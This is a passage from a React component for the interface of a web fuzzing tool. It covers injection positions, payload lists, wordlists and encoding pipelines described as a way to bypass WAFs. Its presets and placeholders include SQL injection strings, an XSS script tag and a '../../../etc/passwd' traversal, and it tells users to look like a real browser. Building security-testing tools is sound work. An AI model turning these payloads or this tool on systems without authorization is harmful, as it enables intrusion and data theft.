                      <HelpTooltip field="targetUrl" showHelp={showContextualHelp} />
                    </Box>
                  </Grid>
                  
                  {/* Headers section with presets */}
                  <Grid item xs={12}>
                    <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 1 }}>
                      <Typography variant="subtitle2">Headers (Optional)</Typography>
                      <Button
                        size="small"
                        onClick={(e) => setHeaderPresetAnchor(e.currentTarget)}
                        startIcon={<AddIcon />}
                        sx={{ textTransform: "none" }}
                      >
                        Add Common Header
                      </Button>
                      <Menu
                        anchorEl={headerPresetAnchor}
                        open={Boolean(headerPresetAnchor)}
                        onClose={() => setHeaderPresetAnchor(null)}
                      >
                        {HEADER_PRESETS.map((preset, i) => (
                          <MenuItem key={i} onClick={() => addHeaderPreset(preset)}>
                            <Box>
                              <Typography variant="body2" fontWeight={600}>{preset.name}</Typography>
                              <Typography variant="caption" color="text.secondary">
                                {preset.header}: {preset.value.substring(0, 40)}...
                              </Typography>
                            </Box>
                          </MenuItem>
                        ))}
                      </Menu>
                    </Box>
                    <Box sx={{ display: "flex", gap: 1, mb: 2 }}>
                      <TextField
                        size="small"
                        label="Header Name"
                        placeholder="e.g., Authorization"
                        value={headerKey}
                        onChange={(e) => setHeaderKey(e.target.value)}
                        sx={{ flex: 1 }}
                      />
                      <TextField
                        size="small"
                        label="Header Value"
                        placeholder="e.g., Bearer your-token"
                        value={headerValue}
                        onChange={(e) => setHeaderValue(e.target.value)}
                        sx={{ flex: 2 }}
                      />
                      <Button variant="outlined" onClick={addHeader} startIcon={<AddIcon />}>
                        Add
                      </Button>
                    </Box>
                    {Object.keys(config.headers).length > 0 ? (
                      <Box sx={{ display: "flex", flexWrap: "wrap", gap: 1 }}>
                        {Object.entries(config.headers).map(([key, value]) => (
                          <Chip
                            key={key}
                            label={`${key}: ${value.substring(0, 30)}${value.length > 30 ? "..." : ""}`}
                            onDelete={() => removeHeader(key)}
                            size="small"
                            sx={{ bgcolor: alpha("#3b82f6", 0.1) }}
                          />
                        ))}
                      </Box>
                    ) : (
                      <Alert severity="info" sx={{ py: 0.5 }}>
                        <Typography variant="caption">
                          No headers set. For most targets, add a <strong>User-Agent</strong> header to appear as a real browser.
                        </Typography>
                      </Alert>
                    )}
                  </Grid>
                  
                  {["POST", "PUT", "PATCH"].includes(config.method) && (
                    <Grid item xs={12}>
                      <TextField
                        fullWidth
                        multiline
                        rows={4}
                        label="Request Body"
                        placeholder={config.method === "POST" ? "username=admin&password=FUZZ" : '{"username": "admin", "password": "FUZZ"}'}
                        value={config.body}
                        onChange={(e) => setConfig(prev => ({ ...prev, body: e.target.value }))}
                        helperText={
                          <span>
                            For form data: <code>username=admin&password=FUZZ</code> | For JSON: <code>{`{"password": "FUZZ"}`}</code>
                          </span>
                        }
                      />
                    </Grid>
                  )}
                </Grid>
              </CardContent>
            </Card>
          </Grid>
          
          <Grid item xs={12} md={4}>
            {/* Quick Help Card */}
            <Card sx={{ mb: 2, bgcolor: alpha("#10b981", 0.05), border: `1px solid ${alpha("#10b981", 0.2)}` }}>
              <CardContent sx={{ py: 2 }}>
                <Typography variant="subtitle2" sx={{ mb: 1.5, display: "flex", alignItems: "center", gap: 1, color: "#059669" }}>
                  💡 Quick Tips
                </Typography>
                <List dense sx={{ py: 0 }}>
                  <ListItem sx={{ py: 0.5, px: 0 }}>
                    <ListItemText 
                      primary={<Typography variant="caption"><strong>FUZZ</strong> = Where payloads go</Typography>}
                      secondary={<Typography variant="caption" color="text.secondary">Put FUZZ where you want to inject</Typography>}
                    />
                  </ListItem>
                  <ListItem sx={{ py: 0.5, px: 0 }}>
                    <ListItemText 
                      primary={<Typography variant="caption"><strong>Start simple</strong></Typography>}
                      secondary={<Typography variant="caption" color="text.secondary">Try directory discovery first</Typography>}
                    />
                  </ListItem>
                  <ListItem sx={{ py: 0.5, px: 0 }}>
                    <ListItemText 
                      primary={<Typography variant="caption"><strong>Watch response sizes</strong></Typography>}
                      secondary={<Typography variant="caption" color="text.secondary">Different sizes = interesting!</Typography>}
                    />
                  </ListItem>
                </List>
              </CardContent>
            </Card>

            <Card sx={{ mb: 2 }}>
              <CardContent>
                <Typography variant="h6" fontWeight={600} sx={{ mb: 2 }}>
                  Options
                </Typography>
                
                <Grid container spacing={2}>
                  <Grid item xs={6}>
                    <Box sx={{ display: "flex", alignItems: "flex-start" }}>
                      <Tooltip title="Number of parallel requests. Start low (2-3) for routers to avoid overload.">
                        <TextField
                          fullWidth
                          size="small"
                          type="number"
                          label="Threads"
                          value={config.threads}
                          onChange={(e) => setConfig(prev => ({ ...prev, threads: parseInt(e.target.value) || 1 }))}
                          helperText="2-3 for routers"
                        />
                      </Tooltip>
                      <HelpTooltip field="threads" showHelp={showContextualHelp} />
                    </Box>
                  </Grid>
                  <Grid item xs={6}>
                    <Box sx={{ display: "flex", alignItems: "flex-start" }}>
                      <Tooltip title="Wait time between requests in milliseconds. Add delay to avoid rate limits.">
                        <TextField
                          fullWidth
                          size="small"
                          type="number"
                          label="Delay (ms)"
                          value={config.delay}
                          onChange={(e) => setConfig(prev => ({ ...prev, delay: parseInt(e.target.value) || 0 }))}
                          helperText="100-500 recommended"
                        />
                      </Tooltip>
                      <HelpTooltip field="delay" showHelp={showContextualHelp} />
                    </Box>
                  </Grid>
                  <Grid item xs={12}>
                    <Box sx={{ display: "flex", alignItems: "flex-start" }}>
                      <Tooltip title="How long to wait for a response before timing out.">
                        <TextField
                          fullWidth
                          size="small"
                          type="number"
                          label="Timeout (ms)"
                          value={config.timeout}
                          onChange={(e) => setConfig(prev => ({ ...prev, timeout: parseInt(e.target.value) || 10000 }))}
                          helperText="10000 (10s) default"
                        />
                      </Tooltip>
                      <HelpTooltip field="timeout" showHelp={showContextualHelp} />
                    </Box>
                  </Grid>
                  <Grid item xs={12}>
                    <FormControlLabel
                      control={
                        <Switch
                          checked={config.followRedirects}
                          onChange={(e) => setConfig(prev => ({ ...prev, followRedirects: e.target.checked }))}
                        />
                      }
                      label="Follow Redirects"
                    />
                  </Grid>
                  <Grid item xs={12}>
                    <Box sx={{ display: "flex", alignItems: "flex-start" }}>
                      <Tooltip title="Route requests through a proxy like Burp Suite (127.0.0.1:8080), ZAP, or mitmproxy for interception">
                        <TextField
                          fullWidth
                          size="small"
                          label="Proxy URL (optional)"
                          placeholder="http://127.0.0.1:8080"
                          value={config.proxyUrl}
                          onChange={(e) => setConfig(prev => ({ ...prev, proxyUrl: e.target.value }))}
                          helperText="Burp: http://127.0.0.1:8080 | SOCKS: socks5://127.0.0.1:9050"
                          InputProps={{
                            sx: { fontFamily: "monospace", fontSize: "0.9rem" }
                          }}
                        />
                      </Tooltip>
                      <HelpTooltip field="proxyUrl" showHelp={showContextualHelp} />
                    </Box>
                  </Grid>
                </Grid>
              </CardContent>
            </Card>
            
            {/* Control Buttons */}
            <Card sx={{ bgcolor: alpha("#f97316", 0.05), border: `1px solid ${alpha("#f97316", 0.2)}` }}>
              <CardContent>
                <Typography variant="subtitle2" sx={{ mb: 2 }}>
                  Estimated Requests: <strong>{calculateTotalRequests()}</strong>
                </Typography>
                
                {/* Backend mode toggle */}
                <FormControlLabel
                  control={
                    <Switch
                      checked={useBackend}
                      onChange={(e) => setUseBackend(e.target.checked)}
                      disabled={isRunning}
                      size="small"
                    />
                  }
                  label={
                    <Typography variant="caption" color="text.secondary">
                      {useBackend ? "Real HTTP Requests" : "Demo Mode"}
                    </Typography>
                  }
                  sx={{ mb: 1 }}
                />
                
                <Box sx={{ display: "flex", gap: 1 }}>
                  {!isRunning ? (
                    <Button
                      fullWidth
                      variant="contained"
                      startIcon={<PlayArrowIcon />}
                      onClick={startFuzzing}
                      disabled={!config.targetUrl || config.positions.length === 0}
                      sx={{
                        background: "linear-gradient(135deg, #f97316 0%, #ea580c 100%)",
                        "&:hover": {
                          background: "linear-gradient(135deg, #ea580c 0%, #c2410c 100%)",
                        },
                      }}
                    >
                      Start Fuzzing
                    </Button>
                  ) : (
                    <>
                      <Button
                        variant="outlined"
                        startIcon={isPaused ? <PlayArrowIcon /> : <PauseIcon />}
                        onClick={togglePause}
                        sx={{ flex: 1 }}
                      >
                        {isPaused ? "Resume" : "Pause"}
                      </Button>
                      <Button
                        variant="outlined"
                        color="error"
                        startIcon={<StopIcon />}
                        onClick={stopFuzzing}
                        sx={{ flex: 1 }}
                      >
                        Stop
                      </Button>
                    </>
                  )}
                </Box>
              </CardContent>
            </Card>
          </Grid>
        </Grid>
      )}

      {/* Tab 1: Positions & Payloads */}
      {activeTab === 1 && (
        <Grid container spacing={3}>
          {/* Helpful explanation at top */}
          <Grid item xs={12}>
            <Paper sx={{ p: 2, mb: 2, bgcolor: alpha("#3b82f6", 0.05), border: `1px solid ${alpha("#3b82f6", 0.2)}`, borderRadius: 2 }}>
              <Typography variant="h6" sx={{ mb: 1, fontWeight: 700, display: "flex", alignItems: "center", gap: 1 }}>
                📍 How Positions & Payloads Work
              </Typography>
              <Grid container spacing={2}>
                <Grid item xs={12} md={4}>
                  <Typography variant="body2" sx={{ mb: 1, fontWeight: 600 }}>1️⃣ Position = Injection Point</Typography>
                  <Typography variant="caption" color="text.secondary">
                    Each position marks WHERE payloads get inserted. If your URL has <code>FUZZ</code>, that's position §0§.
                  </Typography>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Typography variant="body2" sx={{ mb: 1, fontWeight: 600 }}>2️⃣ Payloads = What Gets Sent</Typography>
                  <Typography variant="caption" color="text.secondary">
                    A list of values to try at each position. E.g., "admin", "config", "backup" for directory discovery.
                  </Typography>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Typography variant="body2" sx={{ mb: 1, fontWeight: 600 }}>3️⃣ The Tool Tries Each One</Typography>
                  <Typography variant="caption" color="text.secondary">
                    For <code>http://192.168.1.1/FUZZ</code> with payloads ["admin", "login"], it requests /admin then /login.
                  </Typography>
                </Grid>
              </Grid>
            </Paper>
          </Grid>

          <Grid item xs={12}>
            <Card>
              <CardContent>
                <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 2 }}>
                  <Typography variant="h6" fontWeight={600}>
                    Injection Positions
                  </Typography>
                  {config.targetUrl.includes("FUZZ") && config.positions.length === 0 && (
                    <Button 
                      variant="contained" 
                      color="success" 
                      size="small"
                      onClick={() => {
                        setConfig(prev => ({
                          ...prev,
                          positions: ["FUZZ"],
                          payloads: [[]],
                        }));
                      }}
                    >
                      Auto-detect FUZZ position
                    </Button>
                  )}
                </Box>
                <Alert severity="info" sx={{ mb: 2 }}>
                  {config.positions.length === 0 ? (
                    <>
                      <strong>Getting Started:</strong> If you used a Quick Start Scenario, positions are already set. Otherwise, click "Add Position" below or use "Auto-detect" if your URL contains FUZZ.
                    </>
                  ) : (
                    <>
                      <strong>Position {config.positions.length > 1 ? "s" : ""} detected!</strong> Now add payloads below or paste your own in the "Custom Payloads" section.
                    </>
                  )}
                </Alert>
                
                <Box sx={{ display: "flex", gap: 1, mb: 3 }}>
                  <TextField
                    size="small"
                    label="Position Name (optional)"
                    placeholder="e.g., username, directory, id"
                    value={positionInput}
                    onChange={(e) => setPositionInput(e.target.value)}
                    sx={{ flex: 1 }}
                  />
                  <Button variant="contained" onClick={addPosition} startIcon={<AddIcon />}>
                    Add Position
                  </Button>
                </Box>
                
                {config.positions.length === 0 ? (
                  <Paper sx={{ p: 3, textAlign: "center", bgcolor: alpha(theme.palette.warning.main, 0.05) }}>
                    <WarningAmberIcon sx={{ fontSize: 48, color: "warning.main", mb: 1 }} />
                    <Typography color="text.secondary" sx={{ mb: 2 }}>
                      No positions defined yet. Add positions to mark where payloads should be injected.
                    </Typography>
                    <Typography variant="caption" color="text.secondary">
                      💡 Tip: If you're using a URL like <code>http://192.168.1.1/FUZZ</code>, click "Auto-detect" above!
                    </Typography>
                  </Paper>
                ) : (
                  <Grid container spacing={2}>
                    {config.positions.map((pos, index) => (
                      <Grid item xs={12} md={6} key={index}>
                        <Card variant="outlined" sx={{ border: config.payloads[index]?.length > 0 ? `2px solid ${alpha("#10b981", 0.5)}` : undefined }}>
                          <CardContent>
                            <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 2 }}>
                              <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                                <Chip 
                                  label={`§${index}§`} 
                                  size="small" 
                                  color="primary"
                                  sx={{ fontFamily: "monospace" }}
                                />
                                <Typography variant="subtitle2">{pos || `Position ${index}`}</Typography>
                                {config.payloads[index]?.length > 0 && (
                                  <Chip label="✓ Ready" size="small" color="success" />
                                )}
                              </Box>
                              <IconButton size="small" onClick={() => removePosition(index)} color="error">
                                <DeleteIcon fontSize="small" />
                              </IconButton>
                            </Box>
                            
                            <Typography variant="caption" color={config.payloads[index]?.length > 0 ? "success.main" : "warning.main"} sx={{ mb: 1, display: "block", fontWeight: 600 }}>
                              {config.payloads[index]?.length > 0 
                                ? `✓ ${config.payloads[index].length} payloads loaded`
                                : "⚠ No payloads yet - add some below!"}
                            </Typography>
                            
                            <Box sx={{ display: "flex", gap: 1 }}>
                              <Button
                                size="small"
                                variant="outlined"
                                startIcon={<ListAltIcon />}
                                onClick={() => {
                                  setSelectedWordlist(null);
                                  setShowWordlistDialog(true);
                                }}
                              >
                                Load Wordlist
                              </Button>
                              <Button
                                size="small"
                                variant="outlined"
                                startIcon={<UploadIcon />}
                                onClick={() => {
                                  const input = document.createElement("input");
                                  input.type = "file";
                                  input.accept = ".txt";
                                  input.onchange = async (e) => {
                                    const file = (e.target as HTMLInputElement).files?.[0];
                                    if (file) {
                                      const text = await file.text();
                                      const payloads = text.split("\n").filter(p => p.trim());
                                      setConfig(prev => {
                                        const newPayloads = [...prev.payloads];
                                        newPayloads[index] = payloads;
                                        return { ...prev, payloads: newPayloads };
                                      });
                                    }
                                  };
                                  input.click();
                                }}
                              >
                                Upload File
                              </Button>
                            </Box>
                            
                            {config.payloads[index]?.length > 0 && (
                              <Box sx={{ mt: 2 }}>
                                <Typography variant="caption" color="text.secondary">Preview:</Typography>
                                <Paper sx={{ p: 1, bgcolor: "background.default", maxHeight: 100, overflow: "auto" }}>
                                  <Typography variant="caption" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.7rem" }}>
                                    {config.payloads[index].slice(0, 5).join("\n")}
                                    {config.payloads[index].length > 5 && `\n... and ${config.payloads[index].length - 5} more`}
                                  </Typography>
                                </Paper>
                              </Box>
                            )}
                          </CardContent>
                        </Card>
                      </Grid>
                    ))}
                  </Grid>
                )}
              </CardContent>
            </Card>
          </Grid>
          
          {/* Custom Payload Input */}
          <Grid item xs={12}>
            <Card>
              <CardContent>
                <Typography variant="h6" fontWeight={600} sx={{ mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                  ✏️ Custom Payloads
                </Typography>
                
                {/* Quick payload examples */}
                <Alert severity="info" sx={{ mb: 2 }}>
                  <Typography variant="body2" sx={{ mb: 1 }}>
                    <strong>Quick Examples</strong> (click to use):
                  </Typography>
                  <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
                    {[
                      { label: "Directories", payloads: "admin\nconfig\nbackup\ntest\nlogin\ndashboard\napi\nwp-admin\ncgi-bin\nphpmyadmin" },
                      { label: "Usernames", payloads: "admin\nroot\ntest\nuser\nguest\nadministrator\noperator\nsupport" },
                      { label: "IDs (1-20)", payloads: Array.from({length: 20}, (_, i) => i + 1).join("\n") },
                      { label: "SQL Basic", payloads: "'\n\"\n' OR '1'='1\n' OR 1=1--\n1' AND '1'='1\nunion select null--" },
                    ].map((preset) => (
                      <Chip
                        key={preset.label}
                        label={preset.label}
                        size="small"
                        variant="outlined"
                        onClick={() => setCustomPayloads(preset.payloads)}
                        sx={{ cursor: "pointer", "&:hover": { bgcolor: alpha("#3b82f6", 0.1) } }}
                      />
                    ))}
                  </Box>
                </Alert>

                <TextField
                  fullWidth
                  multiline
                  rows={6}
                  label="Enter payloads (one per line)"
                  placeholder="Enter one payload per line, for example:&#10;admin&#10;administrator&#10;root&#10;test&#10;guest&#10;&#10;💡 Tip: Each line becomes a separate request"
                  value={customPayloads}
                  onChange={(e) => setCustomPayloads(e.target.value)}
                  helperText={customPayloads ? `${customPayloads.split("\n").filter(l => l.trim()).length} payloads entered` : "Enter or paste your payload list here"}
                />
                <Box sx={{ mt: 2, display: "flex", gap: 1, alignItems: "center" }}>
                  {config.positions.length === 0 ? (
                    <Alert severity="warning" sx={{ flex: 1 }}>
                      Add a position first (in the Injection Positions section above) before loading payloads.
                    </Alert>
                  ) : (
                    <>
                      {config.positions.map((pos, index) => (
                        <Button
                          key={index}
                          variant="outlined"
                          size="small"
                          onClick={() => loadCustomPayloads(index)}
                          disabled={!customPayloads.trim()}
                          startIcon={<AddIcon />}
                        >
                          Load to Position {index} {pos ? `(${pos})` : ""}
                        </Button>
                      ))}
                      <Typography variant="caption" color="text.secondary" sx={{ ml: 2 }}>
                        {!customPayloads.trim() && "Enter payloads above first"}
                      </Typography>
                    </>
                  )}
                </Box>
              </CardContent>
            </Card>
          </Grid>
        </Grid>
      )}

      {/* Tab 2: Attack Modes */}
      {activeTab === 2 && (
        <Grid container spacing={3}>
          {(Object.entries(ATTACK_MODES) as [keyof typeof ATTACK_MODES, typeof ATTACK_MODES[keyof typeof ATTACK_MODES]][]).map(([key, mode]) => (
            <Grid item xs={12} md={6} key={key}>
              <Card
                sx={{
                  cursor: "pointer",
                  border: config.attackMode === key 
                    ? `2px solid ${theme.palette.primary.main}` 
                    : `1px solid ${theme.palette.divider}`,
                  bgcolor: config.attackMode === key ? alpha(theme.palette.primary.main, 0.05) : "background.paper",
                  transition: "all 0.2s",
                  "&:hover": {
                    borderColor: theme.palette.primary.main,
                    transform: "translateY(-2px)",
                  },
                }}
                onClick={() => setConfig(prev => ({ ...prev, attackMode: key }))}
              >
                <CardContent>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
                    <Typography variant="h3">{mode.icon}</Typography>
                    <Box>
                      <Typography variant="h6" fontWeight={600}>
                        {mode.name}
                        {config.attackMode === key && (
                          <Chip label="Selected" size="small" color="primary" sx={{ ml: 1 }} />
                        )}
                      </Typography>
                    </Box>
                  </Box>
                  <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
                    {mode.description}
                  </Typography>
                  <Paper sx={{ p: 1.5, bgcolor: "background.default" }}>
                    <Typography variant="caption" color="text.secondary">
                      <strong>Example:</strong> {mode.example}
                    </Typography>
                  </Paper>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>
      )}

      {/* Tab 3: Wordlists */}
      {activeTab === 3 && (
        <Grid container spacing={2}>
          {BUILTIN_WORDLISTS.map((wordlist) => (
            <Grid item xs={12} sm={6} md={4} key={wordlist.name}>
              <Card
                sx={{
                  height: "100%",
                  transition: "all 0.2s",
                  "&:hover": {
                    transform: "translateY(-2px)",
                    boxShadow: theme.shadows[4],
                  },
                }}
              >
                <CardContent>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                    <Chip
                      label={wordlist.category}
                      size="small"
                      sx={{
                        bgcolor: alpha(
                          wordlist.category === "sqli" ? "#ef4444" :
                          wordlist.category === "xss" ? "#f59e0b" :
                          wordlist.category === "lfi" ? "#8b5cf6" :
                          wordlist.category === "cmdi" ? "#dc2626" :
                          "#3b82f6",
                          0.15
                        ),
                        color: 
                          wordlist.category === "sqli" ? "#ef4444" :
                          wordlist.category === "xss" ? "#f59e0b" :
                          wordlist.category === "lfi" ? "#8b5cf6" :
                          wordlist.category === "cmdi" ? "#dc2626" :
                          "#3b82f6",
                      }}
                    />
                    <Typography variant="caption" color="text.secondary">
                      {wordlist.count} items
                    </Typography>
                  </Box>
                  <Typography variant="subtitle1" fontWeight={600}>
                    {wordlist.name}
                  </Typography>
                  <Typography variant="body2" color="text.secondary" sx={{ mb: 2, minHeight: 40 }}>
                    {wordlist.description}
                  </Typography>
                  <Paper sx={{ p: 1, bgcolor: "background.default", mb: 2, maxHeight: 80, overflow: "auto" }}>
                    <Typography variant="caption" component="pre" sx={{ fontFamily: "monospace", fontSize: "0.65rem" }}>
                      {wordlist.sample.slice(0, 5).join(", ")}...
                    </Typography>
                  </Paper>
                  <Button
                    fullWidth
                    variant="outlined"
                    size="small"
                    startIcon={<ContentCopyIcon />}
                    onClick={() => {
                      navigator.clipboard.writeText(wordlist.sample.join("\n"));
                    }}
                  >
                    Copy to Clipboard
                  </Button>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>
      )}

      {/* Tab 4: Advanced Features */}
      {activeTab === 4 && (
        <Box>
          <Grid container spacing={3}>
            {/* Advanced Feature Tabs */}
            <Grid item xs={12}>
              <Box sx={{ borderBottom: 1, borderColor: "divider", mb: 2 }}>
                <Tabs value={advancedTab} onChange={(_, v) => setAdvancedTab(v)} variant="scrollable">
                  <Tab label="Payload Encoding" icon={<CodeIcon />} iconPosition="start" />
                  <Tab label="Payload Generator" icon={<AutorenewIcon />} iconPosition="start" />
                  <Tab label="Payload Mutation" icon={<AutoFixHighIcon />} iconPosition="start" />
                  <Tab label="Response Analysis" icon={<AssessmentIcon />} iconPosition="start" />
                </Tabs>
              </Box>
            </Grid>

            {/* Encoding Tab */}
            {advancedTab === 0 && (
              <Grid item xs={12}>
                <Card>
                  <CardContent>
                    <Typography variant="h6" fontWeight={600} gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                      <CodeIcon color="primary" />
                      Payload Encoding
                    </Typography>
                    <Typography variant="body2" color="text.secondary" paragraph>
                      Encode payloads using various encoding schemes to bypass WAF and filters.
                    </Typography>
                    
                    <Grid container spacing={2}>
                      <Grid item xs={12} md={6}>
                        <TextField
                          fullWidth
                          multiline
                          rows={4}
                          label="Payloads to Encode (one per line)"
                          placeholder="<script>alert(1)</script>&#10;' OR '1'='1&#10;../../../etc/passwd"
                          value={encodingInput}
                          onChange={(e) => setEncodingInput(e.target.value)}
                        />
                      </Grid>
                      <Grid item xs={12} md={6}>
                        <Typography variant="subtitle2" gutterBottom>Select Encodings</Typography>
                        <Box sx={{ display: "flex", flexWrap: "wrap", gap: 1 }}>
                          {[
                            { value: "url", label: "URL Encode" },
                            { value: "double_url", label: "Double URL" },
                            { value: "base64", label: "Base64" },
                            { value: "html_entities", label: "HTML Entities" },
                            { value: "html_decimal", label: "HTML Decimal" },
                            { value: "html_hex", label: "HTML Hex" },
                            { value: "unicode", label: "Unicode" },
                            { value: "hex", label: "Hex" },
                          ].map(enc => (
                            <Chip
                              key={enc.value}
                              label={enc.label}
                              clickable
                              color={selectedEncodings.includes(enc.value) ? "primary" : "default"}
                              onClick={() => {
                                setSelectedEncodings(prev => 
                                  prev.includes(enc.value) 
                                    ? prev.filter(e => e !== enc.value)
                                    : [...prev, enc.value]
                                );
                              }}
                            />
                          ))}
                        </Box>
                        <Box sx={{ mt: 2 }}>
                          <Button
                            variant="contained"
                            onClick={async () => {
                              const payloads = encodingInput.split("\n").filter(p => p.trim());
                              if (payloads.length === 0) return;
                              try {
                                const result = await fuzzer.encode(payloads, selectedEncodings);
                                setEncodedResults(result.encoded);
                              } catch (e: any) {
                                console.error("Encoding failed:", e);
                              }
                            }}
                            disabled={!encodingInput.trim() || selectedEncodings.length === 0}
                          >
                            Encode Payloads
                          </Button>
                          <Button
                            sx={{ ml: 1 }}
                            onClick={() => {
                              const allEncoded = Object.values(encodedResults).flatMap(v => 
                                typeof v === "string" ? [v] : Object.values(v)
                              );
                              setConfig(prev => ({
                                ...prev,
                                payloads: [allEncoded as string[]]
                              }));
                            }}
                            disabled={Object.keys(encodedResults).length === 0}
                          >
                            Add to Payloads
                          </Button>
                        </Box>
                      </Grid>
                      
                      {Object.keys(encodedResults).length > 0 && (
                        <Grid item xs={12}>
                          <Typography variant="subtitle2" gutterBottom>Encoded Results</Typography>
                          <Paper variant="outlined" sx={{ p: 2, maxHeight: 300, overflow: "auto", bgcolor: "#1e1e1e" }}>
                            {Object.entries(encodedResults).map(([original, encoded]) => (
                              <Box key={original} sx={{ mb: 2 }}>
                                <Typography variant="caption" color="primary.main">Original: {original}</Typography>
                                {typeof encoded === "object" ? (
                                  Object.entries(encoded as Record<string, string>).map(([type, value]) => (
                                    <Box key={type} sx={{ display: "flex", alignItems: "center", gap: 1, mt: 0.5 }}>
                                      <Chip size="small" label={type} />
                                      <Typography 
                                        variant="body2" 
                                        sx={{ fontFamily: "monospace", color: "#d4d4d4", wordBreak: "break-all" }}
                                      >
                                        {value}
                                      </Typography>
                                      <IconButton 
                                        size="small" 
                                        onClick={() => navigator.clipboard.writeText(value)}
                                      >
                                        <ContentCopyIcon fontSize="small" />
                                      </IconButton>
                                    </Box>
                                  ))
                                ) : (
                                  <Typography variant="body2" sx={{ fontFamily: "monospace", color: "#d4d4d4" }}>
                                    {encoded}
                                  </Typography>
                                )}
                              </Box>
                            ))}
                          </Paper>
                        </Grid>
                      )}
                    </Grid>
                  </CardContent>
                </Card>

                {/* Payload Processor Pipeline */}
                <Card sx={{ mt: 3 }}>
                  <CardContent>
                    <Typography variant="h6" fontWeight={600} gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                      <AutorenewIcon color="secondary" />
                      Payload Processor Pipeline
                      <Chip label="New" size="small" color="success" sx={{ ml: 1 }} />
                    </Typography>
                    <Typography variant="body2" color="text.secondary" paragraph>
                      Chain multiple encoding transformations in sequence. Example: URL Encode → Base64 → Double URL Encode
                    </Typography>
                    
                    <Alert severity="info" sx={{ mb: 2 }}>
                      <Typography variant="body2">
                        <strong>How it works:</strong> Define a pipeline of transformations. Each step processes the output of the previous step.
                        Useful for bypassing WAF that blocks simple encodings.
                      </Typography>
                    </Alert>

                    {/* Pipeline Builder */}
                    <Box sx={{ 
                      p: 2, 
                      mb: 2, 
                      bgcolor: alpha(theme.palette.secondary.main, 0.05), 
                      borderRadius: 2,
                      border: `1px dashed ${alpha(theme.palette.secondary.main, 0.3)}`
                    }}>
                      <Typography variant="subtitle2" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                        🔧 Build Your Pipeline
                      </Typography>
                      
                      {/* Visual Pipeline Display */}
                      <Box sx={{ 
                        display: "flex", 
                        alignItems: "center", 
                        gap: 1, 
                        flexWrap: "wrap",
                        p: 2,
                        bgcolor: "background.paper",
                        borderRadius: 1,
                        mb: 2,
                        minHeight: 50,
                      }}>
                        <Chip label="Input" size="small" color="primary" />
                        {selectedEncodings.length > 0 ? (
                          selectedEncodings.map((enc, i) => (
                            <React.Fragment key={i}>
                              <NavigateNextIcon color="action" />
                              <Chip 
                                label={enc.replace("_", " ")}
                                size="small"
                                color="secondary"
                                onDelete={() => setSelectedEncodings(prev => prev.filter((_, idx) => idx !== i))}
                              />
                            </React.Fragment>
                          ))
                        ) : (
                          <>
                            <NavigateNextIcon color="disabled" />
                            <Typography variant="caption" color="text.disabled">
                              Click encodings below to add steps...
                            </Typography>
                          </>
                        )}
                        {selectedEncodings.length > 0 && (
                          <>
                            <NavigateNextIcon color="action" />
                            <Chip label="Output" size="small" color="success" />
                          </>
                        )}
                      </Box>

                      {/* Available Encodings */}
                      <Typography variant="caption" color="text.secondary" gutterBottom sx={{ display: "block", mb: 1 }}>
                        Click to add to pipeline (order matters!):
                      </Typography>
                      <Box sx={{ display: "flex", flexWrap: "wrap", gap: 1 }}>
                        {[
                          { value: "url", label: "URL Encode", desc: "Encode special chars as %XX" },
                          { value: "double_url", label: "Double URL", desc: "URL encode twice" },
                          { value: "base64", label: "Base64", desc: "Base64 encode" },
                          { value: "html_entities", label: "HTML Entities", desc: "Convert to &entity;" },
                          { value: "html_decimal", label: "HTML Decimal", desc: "Convert to &#XX;" },
                          { value: "html_hex", label: "HTML Hex", desc: "Convert to &#xXX;" },
                          { value: "unicode", label: "Unicode", desc: "Convert to \\uXXXX" },
                          { value: "hex", label: "Hex", desc: "Convert to 0xXX format" },
                          { value: "reverse", label: "Reverse", desc: "Reverse the string" },
                          { value: "lowercase", label: "Lowercase", desc: "Convert to lowercase" },
                          { value: "uppercase", label: "Uppercase", desc: "Convert to uppercase" },
                          { value: "strip_spaces", label: "Strip Spaces", desc: "Remove all spaces" },
                        ].map(enc => (
                          <Tooltip key={enc.value} title={enc.desc} arrow>
                            <Chip
                              label={enc.label}
                              size="small"
                              variant="outlined"
                              onClick={() => setSelectedEncodings(prev => [...prev, enc.value])}
                              sx={{ cursor: "pointer", "&:hover": { bgcolor: alpha(theme.palette.secondary.main, 0.1) } }}
                            />
                          </Tooltip>
                        ))}
                      </Box>

                      {/* Pipeline Controls */}
                      <Box sx={{ display: "flex", gap: 1, mt: 2 }}>
                        <Button
                          size="small"
                          variant="outlined"
                          color="error"
                          onClick={() => setSelectedEncodings([])}
                          disabled={selectedEncodings.length === 0}
                        >
                          Clear Pipeline
                        </Button>
                        <Button
                          size="small"
                          variant="outlined"
                          onClick={() => setSelectedEncodings(prev => [...prev].reverse())}
                          disabled={selectedEncodings.length < 2}
                        >
                          Reverse Order
                        </Button>
                      </Box>
                    </Box>

                    {/* Live Preview */}
                    {encodingInput.trim() && selectedEncodings.length > 0 && (
                      <Paper sx={{ p: 2, bgcolor: "#1e1e1e", borderRadius: 2 }}>
                        <Typography variant="subtitle2" color="primary.light" gutterBottom>
                          🔄 Live Pipeline Preview
                        </Typography>
                        {encodingInput.split("\n").filter(p => p.trim()).slice(0, 3).map((payload, i) => {
                          // Apply pipeline transformations
                          let result = payload;
                          const steps: { step: string; value: string }[] = [{ step: "Input", value: payload }];
                          
                          selectedEncodings.forEach(enc => {
                            try {
                              switch (enc) {
                                case "url":
                                  result = encodeURIComponent(result);
                                  break;
                                case "double_url":
                                  result = encodeURIComponent(encodeURIComponent(result));
                                  break;
                                case "base64":
